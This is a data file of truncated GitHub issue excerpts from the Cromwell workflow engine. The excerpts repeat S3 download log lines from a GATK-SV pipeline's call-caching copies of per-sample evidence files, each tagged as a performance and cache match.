s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-135/cacheCopy/SR00c.NA19679.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:74237,cache,cacheCopy,74237,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-130/cacheCopy/SR00c.NA19377.txt.gz.tbi; 1608597008325,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-119/cacheCopy/SR00c.NA18945.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-119/cacheCopy/SR00c.NA18945.txt.gz; 1608597012199,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-153/cacheCopy/SR00c.NA20895.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-153/cacheCopy/SR00c.NA20895.txt.gz; 1608597014237,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-78/cacheCopy/SR00c.HG03369.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:20029,cache,cacheCopy,20029,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-136/cacheCopy/SR00c.NA19684.txt.gz.tbi; 1608597331137,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-121/cacheCopy/SR00c.NA18995.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-121/cacheCopy/SR00c.NA18995.txt.gz; 1608597333778,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-117/cacheCopy/SR00c.NA18923.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-117/cacheCopy/SR00c.NA18923.txt.gz; 1608597335401,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-82/cacheCopy/SR00c.HG03472.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:107283,cache,cacheCopy,107283,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-143/cacheCopy/SR00c.NA20321.txt.gz; 1608597070520,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-75/cacheCopy/SR00c.HG03099.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-75/cacheCopy/SR00c.HG03099.txt.gz.tbi; 1608597072537,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-4/cacheCopy/SR00c.HG00150.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-4/cacheCopy/SR00c.HG00150.txt.gz.tbi; 1608597074143,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-42/cacheCopy/SR00c.HG01885.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:36229,cache,cacheCopy,36229,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-144/cacheCopy/SR00c.NA20346.txt.gz.tbi; 1608597348432,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-120/cacheCopy/SR00c.NA18956.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-120/cacheCopy/SR00c.NA18956.txt.gz; 1608597351053,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-124/cacheCopy/SR00c.NA19062.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-124/cacheCopy/SR00c.NA19062.txt.gz; 1608597352822,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-25/cacheCopy/SR00c.HG01344.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:111638,cache,cacheCopy,111638,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-156/cacheCopy/SR00c.NA21133.txt.gz.tbi; 1608597049133,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-127/cacheCopy/SR00c.NA19184.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-127/cacheCopy/SR00c.NA19184.txt.gz; 1608597051239,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-151/cacheCopy/SR00c.NA20845.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-151/cacheCopy/SR00c.NA20845.txt.gz.tbi; 1608597053171,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-10/cacheCopy/SR00c.HG00349.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:30622,cache,cacheCopy,30622,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-17/cacheCopy/SR00c.HG00701.txt.gz; 1608597103907,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-73/cacheCopy/SR00c.HG03009.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-73/cacheCopy/SR00c.HG03009.txt.gz.tbi; 1608597105908,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-53/cacheCopy/SR00c.HG02235.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-53/cacheCopy/SR00c.HG02235.txt.gz; 1608597108506,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-105/cacheCopy/SR00c.NA11894.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:45585,cache,cacheCopy,45585,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-19/cacheCopy/SR00c.HG00844.txt.gz; 1608597317794,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-15/cacheCopy/SR00c.HG00599.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-15/cacheCopy/SR00c.HG00599.txt.gz.tbi; 1608597320422,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-23/cacheCopy/SR00c.HG01275.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-23/cacheCopy/SR00c.HG01275.txt.gz; 1608597322033,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-52/cacheCopy/SR00c.HG02221.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf01",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:103544,cache,cacheCopy,103544,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-23/cacheCopy/SR00c.HG01275.txt.gz; 1608597322033,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-52/cacheCopy/SR00c.HG02221.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-52/cacheCopy/SR00c.HG02221.txt.gz.tbi; 1608597324182,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-113/cacheCopy/SR00c.NA18549.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-113/cacheCopy/SR00c.NA18549.txt.gz; 1608597327069,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-110/cacheCopy/SR00c.NA18507.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:104791,cache,cacheCopy,104791,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-24/cacheCopy/SR00c.HG01325.txt.gz; 1608596994248,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-65/cacheCopy/SR00c.HG02611.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-65/cacheCopy/SR00c.HG02611.txt.gz.tbi; 1608596996095,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-56/cacheCopy/SR00c.HG02299.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-56/cacheCopy/SR00c.HG02299.txt.gz.tbi; 1608596998999,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-133/cacheCopy/SR00c.NA19661.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:16280,cache,cacheCopy,16280,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-30/cacheCopy/SR00c.HG01474.txt.gz; 1608597175918,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-37/cacheCopy/SR00c.HG01794.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-37/cacheCopy/SR00c.HG01794.txt.gz.tbi; 1608597177960,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-64/cacheCopy/SR00c.HG02588.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-64/cacheCopy/SR00c.HG02588.txt.gz; 1608597179945,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-0/cacheCopy/SR00c.NA12878.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:65527,cache,cacheCopy,65527,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-33/cacheCopy/SR00c.HG01607.txt.gz; 1608597277147,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-93/cacheCopy/SR00c.HG03756.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-93/cacheCopy/SR00c.HG03756.txt.gz.tbi; 1608597279104,download: 